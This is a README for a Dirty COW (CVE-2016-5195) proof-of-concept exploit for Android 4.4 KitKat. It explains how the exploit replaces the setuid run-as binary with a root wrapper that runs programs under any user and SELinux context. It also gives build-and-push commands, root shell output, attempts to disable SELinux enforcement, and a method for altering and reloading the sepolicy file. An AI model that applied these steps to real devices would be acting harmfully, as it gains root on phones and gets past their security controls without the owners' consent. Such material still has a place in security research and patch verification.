# CVE-2016-5195
CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

## Info

This is POC of the exec wrapper which can execute app under any user or any SELinux context. Tested on Linux hosts only and on Android 4.4.x KitKat.

## Libraries

`selinux.h` header was taken from Android source:

```sh
curl 'https://android.googlesource.com/platform/external/libselinux/+/android-4.4.2_r2/include/selinux/selinux.h?format=TEXT' | base64 -d > selinux.h
```

In case when your Android NDK doesn't contain `libselinux.so` library, it should be pulled automatically from your smartphone using adb shell.

## Android NDK

You have to download an [Android NDK](https://developer.android.com/ndk/downloads/index.html), unpack it and set the path to you Android NDK directory before running make:

```sh
export PATH=$PATH:/path/to/android/ndk
```

## Description

* `dirtycow.c` - executes dirtycow exploit and replaces original `/system/bin/run-as` which uses `setuid`.
* `run-as.c` - simple wrapper with the root `setuid`.
* `run.c` - wrapper which support execution with any UID/GID and SELinux context.

`run-as.c` doesn't contain `run.c` features becasue `run-as` binary should be as small as possible.

`run.c` binary support the following parameters:

* `-u` - UID or user name
* `-g` - GID or group name (if not set will use UID)
* `-c` - SELinux context string, i.e. `u:r:init:s0`

If nothing was set UID and GID will be set to 0 (root), SELinux context will be inherited from the current session.

## Build

You have to modify `Makefile` in case when you don't compile binaries for the Android 4.4 KitKat and `armeabi-v7a` architecture. The command below will compile, push and replace original `run-as` binary.

```sh
make run
```

## Run

```sh
$ adb shell
shell@Android:/ $ /system/bin/run-as /data/local/tmp/run -u root -g root -c u:r:init:s0 id
uid=0(root) gid=0(root) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:init:s0
```

## The problem

The last existing problem is to disable SELinux (set it to permissive mode). It should be possible to disable SELinux using the command below:

```sh
shell@Android:/ $ run-as /data/local/tmp/run -u system setenforce 0
setenforce:  Could not set enforcing status:  Invalid argument
```

but it doesn't work. Even `echo 0 > /sys/fs/selinux/enforce` return error:

```sh
shell@Android:/ $ run-as /data/local/tmp/run -u system -c u:r:system:s0 id
shell@Android:/ $ echo 0 > /sys/fs/selinux/enforce
1|shell@KC-S701:/ $
```

## sepolicy modification

You can download and modify `/sepolicy` file (using `./dirtycow`). User friendly info could be printed using `seinfo --all sepolicy` command on the host system. When you've modified tje `/sepolicy` file you have to run `setprop selinux.reload_policy 1` on android device to reload the policy (this will trigger `/sbin/ueventd` and `/system/bin/installd` restart, so you can use dirtycow on these files).

* [sepolicy source](https://android.googlesource.com/platform/external/sepolicy/)
* [Exploring Android's SELinux Kernel Policy](https://ge0n0sis.github.io/posts/2015/12/exploring-androids-selinux-kernel-policy/)
* [Tool to inject sepolicy rules](https://bitbucket.org/joshua_brindle/sepolicy-inject/)


## Useful tricks

* `ps -Z` - list running apps with their SELinux context.
* `ls -Z` - list files with their SELinux file context.
* Write the `/cache/recovery/command` file with the `--show_text` contents, then run `adb reboot recovery` (or in details `setprop sys.powerctl reboot,recovery`) and Android will be rebooted into recovery menu. It won't allow you to flash unsigned zip files though.
